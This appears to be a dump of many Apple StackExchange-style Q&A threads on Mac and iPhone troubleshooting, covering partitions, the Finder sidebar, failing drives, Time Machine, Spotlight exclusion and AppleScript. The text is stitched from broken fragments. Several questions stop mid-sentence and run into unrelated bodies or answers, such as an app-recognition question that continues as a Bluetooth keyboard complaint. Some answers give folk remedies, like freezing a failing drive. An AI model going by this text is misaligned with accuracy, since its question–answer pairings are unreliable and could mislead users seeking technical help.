To carry out the installation I created a new partition for Yosemite and so had the option of a dual boot.\nLast week the public beta 4 came through and my existing Yosemite partition was not big enough to allow installation.\nI figured that because it was a brand new machine with no data to be lost I could risk using Yosemite as my only OS, and so I decided to remove Mavericks with the intention of having one single partition with Yosemite. What has happened is that I have now 2 partitions - one prescribed Macintosh HD and the other my Yosemite partition. But I am unable to merge the two partitions or to grow the Yosemite partition from it's initial 20Gb, furthermore the partition entitled Macintosh HD is inaccessible. \n\nThrough using Terminal commands I was able to resize the Macintosh HD, but I am still unable to resize the Yosemite partition drive.\n\nI have discovered that then Yosemite partition was made into CoreStorage, and so have used the Terminal commands to try to resize this - both the Logical Volume Group and the Physical Volume - but the Physical Volume command reports the volume is too small to be made larger, whilst the resizeStack command on the Logical Volume Group generates the following report \"60DF5D65-41F2-41D1-A56E-9C74FFFD3E6D does not appear to be a valid Core Storage Logical Volume UUID or disk\"\n\n\nA: Boot into Recovery HD, open Disk Utility.  Choose Yo Drive in the list and select the Restore tab.  Make Yo Drive the Source and Macintosh HD the Destination.  This will erase all content on Macintosh HD and replace it with the contents of Yo Drive.  Back up anything important on Yo Drive before hand in case of failure during the restore.  After that you should be able to erase the second partition and extend to take up the whole drive.\n\nA: Launch the Terminal and type:\ndiskutil resizeVolume\nYou'll see parameter options you can choose and go from there. \n", "Q: Shared devices not appearing in Network I've encountered a somewhat strange problem on my Mac. Recently, all the devices listed in the 'Shared' section of the Finder sidebar have all disappeared and has been replaced an 'All...\" option.\nStrangely within this option the shared servers don't even appear there. Instead there is a folder called 'Servers' and within that are two shortcuts that lead to the root drive of my Mac (which is named \"glados\" on the network).\n\nHowever, on another mac on my network, things seem all fine and dandy there. It even picks up the troubled Mac (which appears as 'Javan's MacBook Pro' thanks to bonjour) and appear in both the sidebar and the Network folder.\n\nBefore shots get fired, Yosemite has nothing to do with this. I've troubleshooted for hours and hours and have come to the conclusion that it is not the cause.\nI've verified that the network settings are the same on both Macs (and they are) and I've even used a program called 'Bonjour Browser' to scan the network for the AFP share service on both Macs and both can detect each other (and themselves) on the network.\n\nSo I'm pretty sure its not a network issue since the iMac can see the MacBook fine and the MacBook can 'technically' see the iMac.\nAlso, if I manually connect to a shared drive on one of the PC's or the iMac via 'Connect to Server' the connection is fine and appears on the sidebar (however its named as the IP address of the shared drive and is only temporary as it disappears as I disconnect, which is totally useless)\n\nI've reverted back using Time Machine to when the MacBook was running Mavericks and the problem still existed. So it leads me to believe somethings gone wrong with some sort of preferences file perhaps? I've tried deleting com.apple.finder.plst in the ~/Library/ directory and relaunched but that didn't help either.\nI'm fresh out of ideas, and other existing forums on the rest of the internet haven't seemed to fix it. If anyone has a remote idea any help would be appreciated! Thanks internet! :D\nPS. Soz for the screenshot overload.\nEdit: I forgot to mention that I have made sure that all 3 options are checked in the Finder Preferences for the shared sidebar (Back to my Mac, Connected Servers and Bonjour Computers)\n\nA: I found a fix.  I had the same problem after installing OS X Server.\nSimply put, I did the following:\n\n*\n\n*Go to ~/Library/Preferences and find the plist file, depending on your version of macOS:\n\n*\n\n*com.apple.sidebarlists.plist\n\n*com.apple.locationmenu.plist\n\n\n\n*Copy the file for backup purposes and open original with Xcode\n\n\n*Leave the following items and delete the rest:\n\n*\n\n*finderprojects\n\n*favoriteitems\n\n*systemitems\n\n*savedsearches\n\n\n\n*Go to the Apple Menu > Force Quit... and relaunch Finder (which really did nothing but I did it)\n\n\n*Shutdown/Restart your Mac so the changes to take full effect.\nNow I can see my network devices under Shared in the sidebar.\n\nA: I had the same missing shared device problem.  I actually stumbled into a quick fix.\n\n*\n\n*In Finder select \"Go\" then \"Connect to Server\"\n\n\n*In the dropdown list on the right side to the right of the server address there's a drop-down icon.  I clicked on it and it showed a \"Recent Servers\" list.  I figured I'd see if an old connection would work.  I clicked on one of the \"Recent Servers\" and it worked. (I didn't have to put afp://<shared device name>> or IP address or anything in the server address field)\n\n\n*weirdly/magically/cosmically, the \"Shared\" section in Finder instantly re-populated itself with the other missing devices I used to see on my network.  All of them.\nDon't ask me why, but I don't feel like wasting any more time on it and it was super easy.  Perhaps it forced a refresh of the plist or something.....\n\nA: A much simpler way is to delete the plist, reboot and reconfigure.  I have the same problem after upgrading to 10.11 and this fixed it.\n\n\n*\n\n*Go to: ~/Library/Preferences \n\n*Move the file named com.apple.sidebarlists.plist (and com.apple.sidebarlists.plist.lockfile if there is one) to the Trash.\n\n*Reboot.\n\n\nThe plist will regenerate and you can go to Finder > Preferences > Sidebar to reconfigure.\n\nA: If you follow the step just above of deleting com.apple.sidebarlist.plist, then empty trash (it will say you can't delete com.apple.sidebar.plist because it is in use) click continue, then force quit Finder. \nAfter a few seconds the Shared (network) list starts to rebuild.\nI agree with SteppingHat it is always better to find the root cause of the problem, but rebuilding the plist does 'fix' the problem when you don't have the time (or skills) needed to delve into the problem.\nAt least you do not necessarily have to reboot as a result!\n\nA: My missing drive is attached to a shared server as well.\nWent to the drive on the server and clicked it and keyed Cmd/I (info).\nI found an unchecked \"Shared\" box under the General tab.\n\nA: In my case this appears to have been caused by a Double NAT situation.\nI have a T-Mobile Home Internet gateway plugged into my router to provide the internet service. All computers were connected to the inner network of the home router. Routing cannot be turned off on the LTE gateway, unfortunately.\nI now switched the AirPort Extreme Router Mode to Off (Bridge Mode) via AirPort Utility. Also known as Access Point mode. All routing is now done by the T-Mobile box instead.\nThe other Mac is now visible in the Network sidebar of Finder. Screen Sharing works. Double NAT seems to cause the issue.\n", "Q: Finder Continually Freezing I have a problem with the Finder App in Mac OS 10.9.4 where the finder will freeze after a few minutes. This is very similar to the issue here: Finder slow/freeze under Mavericks\nIn fact, deleting the plist file resolves the issue. But only for a few minutes then the freeze comes back.\nWhat I have just noticed now though, is that I don't think Finder is freezing, but rather the display is not updating. I think this because I can open the Finder while it works, select a file, wait for it to freeze - click some else in the window to confirm - click on a file, then press \"return\". Here the change file name action will occur, the part of the window will \"unfreeze\" and the highlighted filename will appear and be changeable. Press enter and it will \"freeze\" again.\nI should point out that this is currently occurring on a brand new macbook pro with 10.9.4 installed about 2 days ago. I used the migration assistant to copy data from my old macbook to this one. And the problem was also occurring on the old macbook.\nI can't think of anything I installed that would cause this and I think I'm up to date. \nEdit:\nConsole output every time I click on the

This resolved the issue.\n\nA: The issue was created because either the Google Drive App or the Dropbox App lost their download directories. But the shortcut links were still in Finder on the left.\nOnce I removed the shortcuts to these folders the issue was resolved.\nNot sure of the technical details behind it, but something to check for next time.\n\nA: Google's Backup & Sync utility's finder extension that shows status often is the problem. It's easy to turn it off within the app and Finder seems to work.\n\nA: I tried removing Google drive, also reinstalling OS and repairing permissions. Nothing worked so I installed a 3rd party app to do the job of finder instead\nhttps://itunes.apple.com/us/app/commander-one-free-dual-pane/id1035236694?mt=12\nIt's working fine so far\n", "Q: I think my HD is failing. Can't backup files from recovery mode. How can I preserve my data? I'm really worried, and I'm hoping that you guys can help me salvage some files. Here's what happened:\nThis morning I woke my iMac up from sleep, but it was hardly responding. I would click something and it would show the colorwheel spinning for 30 seconds before responding. So I rebooted, but then it got stuck on the apple logo with the loading symbol for about 15 minutes, then it started osx but it responded even less and the desktop background disappeared every 20 seconds and turned grey.\nSo I booted into recovery mode and tried to verify the HD, which failed. Then I tried repairing it but it failed again, saying that I should backup my files and repartition my HD. I have an external HD, but it doesn't have enough space for me to save an image of my entire HD to it. So I'm trying to backup files manually through the terminal, but that's not working either. At first I couldn't even see my HD from the terminal in recovery mode (like it wasn't mounted). After rebooting a couple of times I can now access my HD from the terminal in recovery, but when I try to copy a file to my external drive it gives an \"input/output error\" most of the time.\nThis all sounds really bad to me. Is there anything I can do?\nps: I tried booting into my windows bootcamp partition but that didn't work. The error message said something about inserting a boot cd if I remember correctly.\n\nA: I had this problem too, the best thing you can do is replace the harddrive since it will eventually break beyond repair.\nMacs are quite sensitive to faulty hdd's so there is a good chance you can still use the drive as external drive and get your data from it.\nso:\nReplace the drive yourself if you can (ifixit) or have it replaced\nGet a hard drive enclosure for your old drive\nplug it in your imac and drag back the files you still need\nOnce you've removed the failing/failed drive, you can then use an inexpensive USB to SATA adapter and see if any of the off-the-shelf file recovery software can read some of your data from the drive. Data Rescue might be a good tool to start with since the free demo will tell you what it might be able to recover before you have to spend $$ on the software.\nLastly, sending the failed drive into a professional will cost $$$ but if you really need the files or pictures back, that's often the best chance of success.\n\nA: I would try to mount your hard drive via \"target disk mode\".  This will require another computer but works much better if possible.\nSupport page for transferring files via target mode.\nhttp://support.apple.com/kb/PH10725\n\nA: I've seen this happen a few times in the district i work for. We have almost 13,000 macs total. What I usually do is boot the machine with the bad hdd into target disk mode by holding the T key at startup. Once its in target disk mode you can plug it into another mac via thunderbolt and it should show up in Finder. If it doesn't show up in finder then open disk utility and try to repair it which will probably fail, but it will usually allow it to populate in Finder. You can then copy the files off that are most important.\n\nA: Officially, I'm going to say find a cheap software solution or a professional that your comfortable with, but ...\nUnofficially, I've had success sticking my drive in the freezer for a few hours and trying standard recovery again(I'm not telling you this...I'll disavow it)\n", "Q: Format, clean install, & restore iPhone 3GS I have been using iPhone 3GS for almost 3 years now, and the phone has got pretty slow. I understand that there are many reasons for the phone getting slow, but I want to try to improve its performance, even if it is by a meagre amount, by formatting it completely and installing the latest iOS it can support, i.e. 6.x.x. \nHowever, I don't want to lose important data like messages, contacts, notes, internet/network settings, etc. by doing a format and clean install. I have the latest iTunes installed, and would prefer iTunes for this process. I know how to update iOS using iTunes and restore from backup, but I am not sure about format + clean install AND then restore all the important data.  \nCan anyone please advice me how should I do this task?\n\nA: *\n\n*Connect the device to iTunes and click Back Up Device.\n\n*Once the backup is complete, click Restore iPhone and follow the instructions to restore iOS on your iPhone.\n\n*Once this is complete, iTunes will prompt you to restore your backup which will restore all your data back to your device. All your data will be restored to your device except account passwords unless your backup is encrypted.\n\n\nA: @grgarside is correct. I will add a couple other notes. \nI have used this iPhone 3GS since it was released 5 years ago, most of the time, I have not even used a case. It just keeps going. Just a couple of week ago, I decided that it was getting unacceptably slow and so I decided to do a full reset. \nMost of your apps should restore just fine with this process. However, I had a few apps that could not be restored. iTunes had apparently downloaded newer versions of the apps that required iOS 7 or 8. I was able restore these apps by directly installing them via the iPhone's App Store. I don't believe that I lost any data doing this, although the affected Apps where things such as Weather apps and games that did not have much in the way of important data. If you have critical data in apps which you do not have access to via other iOS devices, iCloud, Dropbox, etc you may want to careful research that restoring for the specific app.\nDoing a full restore did nicely speed up my iPhone and it recovered around 6GB of space on a 16GB phone which I cannot otherwise explain. This 6GB was classified in iTunes as being in \"Apps\" and \"Other\", but I don't know exactly what it was used for. \n", "Q: MacBook Pro won't recognise Sandisk 64GB Mini SD card I bought a 64GB Sandisk for my GoPro Hero 3+ and it works fine.\nHowever, when I either plug in my GoPro directly via a USB cable or try to access the drive by using an SD-card adapter, all that comes up is\n\nThe disk you inserted was not readable by this computer.\n\nThe options presented are Initialise, Ignore and Eject.

For example:\n------------    ------------\n|          |    |          |\n|     1    |    |     2    |\n|          |    |          |\n------------    ------------\n\nbecomes\n------------    ------------\n|          |    |          |\n|     2    |    |     1    |\n|          |    |          |\n------------    ------------\n\nwhile retaining application window layouts?\n\nA: Working om @Tetsujin's idea as I have the 'Displays have separate Spaces' check.\n\n\n*\n\n*Check the 'Displays have separate Spaces'\n\n*Create at least two spaces  for each monitor.\n\n\nMonitor 1:\n\nMonitor 2:\n\nIn this example  Desktop 1 on monitor 1  and Desktop 3 on monitor 2   are my main ones.\nTo swap a desktop space over to another monitor. That desktop space must not be the active one.\nSo to swap  Desktop 1 over to Monitor 2,  Desktop 2 must be the active one first.\nYou can then Drag Desktop 1 over to Monitor 2.\nThe same is for Desktop 3 on monitor 2 going over to monitor 1.\n*Desktop 4** must be the active one first.\nYou can then drag Desktop 3 over to monitor 1.\nMonitor 1:\n\nMonitor 2:\n\nAs you can see the desktop space have been swapped and I can now use them on the displays with the windows in place.\n\nA: In the absence of any other answers, I'd say 'no'. Even if you swap monitors from left to right in System Prefs > Displays, they retain their 'physical' layout, merely change which way you need to move the mouse to swap over.\nThough... a thought - what if you assign each monitor to be a different Space & swap Spaces for each monitor? I can't test as I don't use that method & don't want to break my existing setup just to experiment.\n\n", "Q: How to open a file as plain text in TextEdit? I have a *.rtf file which I want to open as plain text. How can I do this?\n\nA: TextEdit > Preferences > Open and Save\nCheck \"RTF-files as RTF-code instead of formated text\" and reopen the file.\n\nA: If you want a plain text version (without seeing all the RTF encoding) open the file, then Format > Make Plain Text (shift-command-T).  This is going to change the original in the file system, so if you do not want to lose the .rtf version, make a copy first.\n", "Q: Bootcamp + Windows 8.1 + Apple Macbook 2011 Recently I installed Windows 8.1 64bit on my Macbook Pro (2011). Everything went fine and I am able to duel boot using Bootcamp.\nOnly issue I am facing is poor performance in Windows. Its taking around 1-1.5 minute to boot, while another laptop of dell with i3 processor and 4gb ram is able to boot in 4-6 seconds in same OS. \nMy macbook configuration is not latest but it with 2nd gen core i5 and 4 GB ram it should be faster (OS X boots in 13-16 seconds). \nAlso when running Visual Studio in Windows noticed that my disk i/o goes to 100% utilization and that time macbook goes terribly slow. So somewhere it seems related to hard disk speed. However I want to be sure before investing in new hard disk. \nSo if getting a new 7200 RPM hard disk with 16MB cache can solve the issue or if its due to Bootcamp virtualization and for disk i/o Windows has to go through bootcamp drivers and thus making process slow. I already tried specifying Pagefile size in Windows with no noticeable change. \nYet if adding memory instead of HDD can solve issue then I would go for memory route.\nSo please suggest me, how to determine exactly what is not correct for Windows 8.1 on Macbook pro and what sort of upgrade can solve the issue. \nThanks\n[Update]\nI tried ReadyBoost option with no luck. I found a 16 GB brand new USB stick, dedicated that entirely for ReadyBoost in Windows 8.1 and yet facing similar performance (or might be even slower). \nAlso looking at task manager, it seems plenty of RAM is free for Windows but HDD is active 100% for most of the time and average response time is 810ms (doesn't sound good to me, yet not sure on that). CPU usage seems fair.\n\n\nA: I can say it's not memory. I have a new MBP since 1 week, with a SSD under WIN64 8.1 and 16 GB of memory and exactly the same behavior, instead maybe it's not permanently, maybe 100 % during 10 s every 5 or 10 minutes.\n\nA: SSD might do it - that's what I'm guessing is the difference between your boot time of 1:30, which is about right for an HD boot drive, compared to 5s, which is fast even for an SSD [I'd suspect it was hibernating rather than booting to be quite that fast]\nMore RAM would also help a lot - 4GB is bare minimum for a modern 64-bit OS, 8 is more acceptable, 16 would be nice. Your lack of RAM will be what is causing Visual Studio to be paging to the hard drive, at a guess, & causing the slowdown.\n\nA: You might try adding a ReadyBoost drive.  I have not tried this with Windows on a Mac, but on PCs, ReadyBoost improves performance and boot times significantly.  Adding a 4- or 8-gb USB or SDCard and formatting it for ReadyBoost may help with your 4gb machine.\n", "Q: Can I back up a single folder on time machine? Basically, I do a lot of work from home, some of which is confidential work. My company has a policy which restricts me from using any form of 'Cloud' to back my files up, so I have set up my time machine to a partition drive on a work server. This however tries to back up my whole Macbook, but I only want to back up the folder which contains my work. \nIs there anyway I can set it up to just back up the single folder, as the partition will not have enough space to back my whole Macbook up, and I also have personal files on which would not be required.\n\nA: You can specify folders to be excluded from your Time Machine backup, specifically, you could specify everything BUT your specific files. You can access this by going to system preferences > time machine > options.\nFor example, I have an SD card that's always in my MacBook Air missing from my time machine backup, because I prefer to keep that separated. So I added that device as excluded.\n\nA: Short answer... \"Get Backup 3\" from the Mac Apps Store.\nI'm looking for the same solution, (Or was).  Basically I want to back up just one folder multiple times a day to a flash drive, similar to the way Time Machine does.  BETTER YET! (Million $ idea here...) I would like a local cloud, i.e. I make a change, it updates my local backup on my flash drive to be in sync right then and there when I make the change (Like drop box does).  The closest thing I have found is \"Get Backup 3\" on the Mac App store.  You can choose an Origin folder and a destination folder and set it to synchronize the two.  You can choose the direction as well which is great, : Folder A to Folder B, or Folder B to Folder A, or even Bi-Directional updates.  You can also schedule sync times.  I set mine up for close to the end of the day.  It backs up and I leave my thumb drive at work in case my laptop ever gets stolen at least I have a copy of my files backed up (Network here is very restrictive and painfully slow).\nHope that helps.\n", "Q: OS X Yosemite - My wired keyboard does not work anymore I just downloaded OS X Yosemite Beta for testing  on my MacBook Air 11.\nBut my wired keyboard stopped to work.  Both the usb ports won't recognize the keyboard anymore.  I also tried to used even without the little USB extension cord that comes with the box.  any other idea do you have to make my WIRED APPLE KEYBOARD work again?\n\nA: I experienced the exact same issue when I downloaded Yosemite.  I spent well over an hour with Applecare troubleshooting, PRAM resets, everything.  Tried all the different ports -- it was a mystery and they said I had to bring it to the store.  So I shut the computer down and brought it to the store a few days later, and miraculously the keyboard worked on the first start.  I felt like an ass.  Just this morning I downloaded the latest Yosemite update, and the exact same thing happened.  I tried all the proper troubleshooting as last time with the same non-results.  This time I said, let me shut my computer down for a few hours, unplug the keyboard, and basically simulate what I did last time at the store, but without the hassle.  Sure enough, I just restarted and re-plugged the keyboard in and it works again.  \n\nA: I've run into a similar problem after installing Yosemite(not beta but full release) and my corded keyboard is not recognized after boot up. Unplugging and replugging the keyboard forces the Mac to recognize the keyboard (so it is just a nuisance at this point) but I've noticed that a USB external drive keeps ejecting it's self. Perhaps there is a USB bug in Yosemite?\n\nA: Had the same issue myself using wired Apple keyboard (model A1243)on a late 2013 MacBook Pro Retina and running Yosemite 10.10.2.\nTried all resets above and power offer etc disconnecting all accessories,all to no avail.\nThen tried a method from another site forum which suggested plugging a USB stick into one of the keyboard USB sockets.\nWorked a treat.The Mac seems to find the USB stick and brings in the keyboard.\nI have tried again without the USB stick and the keyboard doesn't fire up.\nSeems to work this way every time.,so have left the stick in place which just has a few odd photo and data files on it.\n", "Q: How can I set Numbers to automatically copy a row of data from one sheet to another sheet? I have a Numbers spreadsheet that has years worth of data in it. I'd like to call out specific rows in the spreadsheet and copy just those rows into a new sheet in the same file where I'd like the data collected. The rows I want called out all contain two specific words in the same column.\nSo, ideally, I'd like a function that I can match a search for \"john doe\" in sheet 1-table 1-column G, select the whole row of data, copy it, and paste it into sheet 2.\nWhat function, or several functions, can use to accomplish this?\n\nA: I don't know if it's possible to do this with functions, but it might be. There is a function called VLOOKUP that seems like it would do what you want, but I couldn't get it to quite work in my experimenting with it—a function that exists within one cell has a hard time returning multiple values for multiple cells.\nWhat I think does work, though perhaps not as convenient as you might want, is the filter view. On the right side of the window, if you select the view that says \"Sort & Filter\" and the Filter tab, you can \"Add a Filter\" that will match a value in a specified column. Toggling that filter using the checkbox in the corner of that Filter's box will hide all of the rows that don't match that criteria, then it's a simple matter of highlighting all of the cells, copying and pasting to another sheet. \nUnfortunately, this won't continue to add rows as you add rows in the first sheet, so if that functionality is something you need, this won't answer your question. If you only need a one-time copy, though, I think that this is the easiest option (and the only one that I know of, but I'm not extremely familiar with Numbers).\n\nA: Obviously, this is an old question but it showed up for me and it's something I've occasionally wanted to do so I thought I'd post a belated answer.\nIt anticipates that document 1 will have two tables on sheet 1, and that table 2's size can encompass the copied data.

And obviously, it has no error handling.\ntell application \"Numbers\"\n    tell table 1 of sheet 1 of document 1\n        -- because of the indecent and desperate need for Numbers to wrap text\n        set text wrap of cell range to false \n\n        set kc to column \"C\" -- key column\n        set rp to (cells of kc whose value contains \"September\") -- matching rows\n        set hr to {} -- Get headings to copy to table 2\n        copy value of cells of row 1 to hr\n        set db to {} -- get cell values from matching rows\n        repeat with rs in rp\n            copy value of cells of row of rs to end of db\n        end repeat\n        -- each row's data will appear like this: {3.0, \"Sun\", \"September 24\", \"W\", \"Denver Broncos\"}\n    end tell\n        -- set db to rest of db -- If heading row contains match then uncomment\n\n    tell table 2 of sheet 1 of document 1\n        clear cell range\n        set rc to count of db -- row count\n        set cc to count of item 1 of db -- column count\n        repeat with y4 from 1 to rc -- for every row\n            repeat with x8 from 1 to cc -- for every column\n                set value of cell x8 of row (y4 + 1) to item x8 of item y4 of db\n            end repeat\n        end repeat\n        tell row 1 -- Set table headings to match table 1\n            repeat with j from 1 to count of columns\n                set value of cell j to item j of hr\n            end repeat\n        end tell\n        set text wrap of cell range to false -- see above\n    end tell\nend tell\n\n\nThis is not part of the answer but loads sample data into table 1 (min 5x5)\ntell application \"Numbers\"\n    tell table 1 of sheet 1 of document 1\n        set column count to 5\n        set row count to 5\n        set ev to {{\"Week\", \"Day\", \"Date\", \"WL\", \"Opponent\"}, {2.0, \"Sun\", \"September 17\", \"L\", \"Carolina Panthers\"}, {3.0, \"Sun\", \"September 24\", \"W\", \"Denver Broncos\"}, {4.0, \"Sun\", \"October 1\", \"W\", \"Atlanta Falcons\"}, {5.0, \"Sun\", \"October 8\", \"L\", \"Cincinnati Bengals\"}}\n        set evy to count of ev\n        set evx to count of item evy of ev\n        repeat with y from 1 to (evy)\n            repeat with x from 1 to evx\n                set value of cell x of row y to item x of item (y) of ev\n            end repeat\n        end repeat\n    set format of column \"C\" to text -- date format requires special handling\n    set text wrap of cell range to false\n    end tell\nend tell\n\nNote on date format: You can't compare a string to the month of a date object. You could probably manufacture a method by breaking down the date cells: set x to value of cell \"C2\", set y to month of x, set z to x as text but it should be easier to convert to text, run the script normally and if necessary, convert back to date.\n", "Q: how does an app recognize the phone?

It is very intermittent but it happens regularly all day. It's intolerable.\nThe keyboard is a cheap bluetooth Anker keyboard. The touchpad is a Logitech magic pad equivalent.\nIs there such a thing as Bluetooth interference? Because the keyboard, computer and touchpad are all very close to each other. And can it make sense that a bluetooth keyboard works well on an iPhone and badly on a Mac Air?\nThe other thing I noticed is from time to time I get the \"touchpad reconnecting\" message as a ghost overlay over the screen - you know the one I mean?\nWhat is going on?\n\nA: Unfortunately the 2.4 GHz band, which Bluetooth uses, is rather crowded. Therefore interference with WiFi (802.11b/g/n/ax), microwaves, USB 3 devices, etc. are quite common. Apple has a support document on the issue and suggests a list of measures (see the link for all suggestions):\n\nHow to reduce wireless interference\nThese general steps can help achieve a cleaner, stronger wireless signal:\n  \n  \n*\n  \n*Bring your Wi-Fi device and Wi-Fi router closer together. Bring the Bluetooth devices that are connecting to each other closer together. \n  \n*Avoid using your wireless devices near common sources of interference, such as power cables, microwave ovens, fluorescent lights, wireless video cameras, and cordless phones.\n  \n*Reduce the number of active devices that use the same wireless frequency band. Both Bluetooth and Wi-Fi devices use the 2.4 GHz band, but many Wi-Fi devices can use the 5 GHz band instead. If your Wi-Fi router supports both bands, it might help to connect more of your Wi-Fi devices to the 5GHz band. Some dual-band routers manage this for you automatically.\n  \n*Configure your Wi-Fi router to use a different Wi-Fi channel, or have it scan for the channel with the least interference. Most routers perform this scan automatically on startup or when reset.  \n  \n\nAs a first measure, I would strongly suggest to check for the frequency of your WiFi connection. Press alt and click on the WiFi symbol. If under \"Channel\" it says 2.4 GHz, try switching your router to the 5 GHz band. \nTo troubleshoot WiFi interference further you can also use the Wireless Diagnostics.app tool. Try Spotlight or head over to /System/Library/CoreServices/Applications. Once you launched the app, you can press e.g. alt+cmd+5 for the performance logger.\nAnother source of interference are microwaves. I once actually had the issue what when my colleagues would warm their food, my mouse and wifi would stop working. Try re-locating your desk or microwave (or any other source of 2.4 GHz emissions) in that case.\n\nA: I've had this same exact issue with a Bluetooth apple magic mouse. The culprit for me was the rechargeable batteries that I was using. Before I changed the batteries it would constantly lose connectivity and then connect again a few seconds later. It was very frustrating.\nDid your keyboard and touchpad come with any drivers? If so are the up to date?\n", "Q: Strange network activity virus when Aiport is off / No Wi-Fi So I have this strange issue on my aging MBP (pre-retina generation, running 10.8.5 (need this for Maya 2013 to run), where basically the network is always showing activity even when I am not connected...\nI am starting to suspect that there is some kind of virus in play, maybe?\nCould someone provide me with some advice.

My wife was on one of her Facebook accounts on the Facebook app on my iPad one day. And when she went to log out, instead of the normal login screen, it now says Logged in as Xxx Yyyy with Xxx Yyyy being substituted here for my wife's account.\nThere’s a link below that that says Not Xxx Yyyy?, which gets you to the normal login screen so you can log into other accounts; but what I want to know is how do we get that account logged out properly so that the Facebook app goes to the normal login screen directly?\nThis is on iOS 8.2. One of the comments suggested I sign in with another account and log out with 'Remember me' unchecked, but I don't see a 'Remember me' check box on either login or logout. Also, this is the Facebook app itself, not the Settings app.\nUpdate: Instead of the Logged in as link, there's now two pictures, one for each of my wife's accounts, with the account names below them. (And, there's a Log in as a different user link below.) It seems that the FB app is being changed to allow one tap logins or something. But there should still be a way to actually log out in such a way as to force the password entry next time, shouldn't there? I'm concerned that there's now this state that the app can be left in where someone can just click and go right into one of the accounts on the initial screen without typing a password. (Granted, the FB site has a 'keep me logged in' feature when you log into it from a browser, but at least there, when you log out, you're actually logged out.)\nUpdate 2: As it turns out, the Facebook app's new behaviour is, indeed, a new feature for logging into your account(s) with one tab and no need to type your password. (When I logged into my account, I was greeted with a little dialogue that asked if I wanted my account to be saved like that (with an optional 4-digit passcode). I was able to get rid of one of the accounts from the app (the first one that showed up) by going to the Settings app and deleting the account from the Facebook app. For whatever reason, the other account isn't showing up there. Nor is there any option to add a passcode after the fact. Anyone know if there's a way to get at (and delete) all accounts that have been saved by the FB app?\n\nA: When I still had the profile pics (or, rather, the one that I wasn't able to delete from the Setup app) visible in the Facebook app, I noticed that there was a link at the bottom of the screen called 'Login Settings' or something along those lines. Tapping that brought up a dialogue that lists the accounts that are set for instant login, so I was able to delete the other account from there (you can set or change passcodes from there, too, if that's your preference), and I'm back to the more secure old behaviour of needing to type in the passwords for all of our accounts.\n", "Q: Terminal not recognising commands I have tried to add TextWrangler to the path environment modifying the file .bash_profile.

I did not want to pay for the upgrade to Server.app version 3.\nThe app store keeps reminding me there is an update for the Apple server program but when I tried to update it it told me I'm not eligible for it because I don't have Mavericks OS, the most current OS version.

My Macbook HD got corrupted and it couldn't be repaired. Being a 2011 Macbook model, I decided to buy a SSD to be the primary HD and a second 1TB to be used instead of cdrom (using a kit from maxupgrades).\nSo far, so good. Problem is: now I want to recover/restore a Time Machine backup to this new 1TB hard disk (that isn't the primary one). Which is the best way to avoid data loss in the process? Can I just copy the files from /Backups.backupdb/Latest?\n\nA: Well... the answer when you posted this question WAS yes.  You could just turn off auto-backups and copy the backups folder to a new drive and set Time Machine's prefs to use that drive.  \nBut if you've migrated to Mojave, good luck. Apple has seen fit to remove that ability from even an admin's hands.  You don't have the ability to modify the Backups.backupdb folder or contents, even with SIP disabled.  \nEDIT: I think I found a workaround.  You can't modify Backups.backupdb, but you can delete it and replace it.  Back up your backups, if you feel the need.  Create a folder named \"WhosTheBoss\" or \"ImTheBoss\" and put any backups that you want to keep in there (with the same directory structure).  Delete the original Backups.backupsdb folder and make that the name of \"WhosTheBoss\".

I know that you can exclude entire directories or files with a particular extension from Spotlight. But can I hand-pick files not to be searchable by Spotlight, preferably with a file system flag? I am a writer and keep old copies of my drafts but they muck up Spotlight with lots of search results.\n\nA: .noindex\n\nOne of the fastest ways to hide a file or folder, from Spotlight, on\n  the fly is to add the .noindex extension to the end of the filename or\n  folder. The simplest way to get those files hidden is to create a\n  folder, preferably named something innocuous, and add the extension to\n  the end of the name. I’ll end up with a folder named “Nothing to See\n  Here.noindex” or something similar.\n\nHide just a single file\n\n\nSelect the file to be hidden. Right-click and select Get Info, or\n  click Command+I. Find the Name & Extension field, and replace the\n  current extension with .noindex. When prompted to confirm that I want\n  to change the extension, I agree. Now my file is properly hidden from\n  Spotlight search.\n\nFinlay:\nFinder won’t know what to do with my file anymore, though. Look to the drop-down labeled Open With, and select an application to handle the file. Be careful of setting a single application to handle all .noindex files, as many different file types may be hidden from Spotlight, and OS X sometimes creates .noindex files itself\n", "Q: Applescript to automatically add .noindex extension to a file? I'm interested in excluding certain files from Spotlight, and it was suggested to add the .noindex extension. I'd like to automate this. How is it possible to do via Applescript?\n\nA: The following AppleScript will append the extension .noindex to any single file. To use this particular script, paste it into a new AppleScript document and save it as an Application. It will have a Application like icon with an arrow. This means the script is a droplet. To rename any single file, simply drop the file on top of this application's icon, and the file will have been renamed in under a second.\non open theFileToRename\n    tell theFileToRename\n        tell application \"Finder\"\n            set theName to the name of file theFileToRename as string\n            set extension to \".noindex\"\n            set the name of file theFileToRename to (theName & extension)\n        end tell\n    end tell\nend open\n\nIf you don't want to use the functionality of Droplets, the following script will prompt you to select a file:\nset extension to \".noindex\"\nset theFileToRename to (choose file with prompt \"Select a file to append the \\\"\" & extension & \"\\\" extension to.\" without multiple selections allowed)\ntell application \"Finder\"\n    set theName to the name of file theFileToRename as string\n    set extension to \".noindex\"\n    set the name of file theFileToRename to (theName & extension)\nend tell\n\nI hope this is useful to you.\n\nA: You can use simple command inside Terminal.app to rename all files in directory including subdirectories. Navigate to directory in which You have files to rename (cd /path/to/dir) and run this command:\nfind . -name \"*\\.txt\" -exec bash -c 'mv \"{}\" \"{}.noindex\"' \\;\n\nThis will rename all txt files.

I just bought my first Apple product (iPhone) a few days ago and from the moment I switched on I have been asked to use the Apple ID and iCloud for pretty much everything.\nI have a concern, i.e. if I have an Apple ID registered with my real name, address, etc. will Apple and/or iCloud always know all my browsing data, my emails, email passwords, etc.?\nIf yes, is there a way to be completely \"cut off from the cloud\"?\nI am not feeling completely secure enough to check my normal e-mail from the iphone until I am 100% sure nobody (at least at Apple) can read it.\nWhat steps can I take to ensure that my data is least exposed to the world/Apple?\ne.g. would using fake personal data help?\nIf you ask why, well, there's nothing much I want to hide except some nighttime activities I don't want anybody to know about - for obvious reasons :-)\n\nA: Apple is generally good about privacy and security, and risks their reputation if they were to violate user expectations by secretly looking at private data they say they don't look at. However, for the more cautious (including me), some default settings do need to be changed. Keep in mind also that iOS devices access a number of non-Apple \"cloud\" services in their default state, not just Apple services. A few general points, and a few specific default settings changes:\n\n\n*\n\n*You do not need an AppleID to use an iOS device, unless you want to take advantage of web-based services such as iTunes Store, App Store, and iCloud.\n\n*You can supply fake data to create an AppleID, and use a gift card to fund any purchases. Just remember to keep track of exactly what info you provided.\n\n*You can actually use multiple AppleIDs for many of the the different services, e.g., iTunes, iCloud, Home Sharing 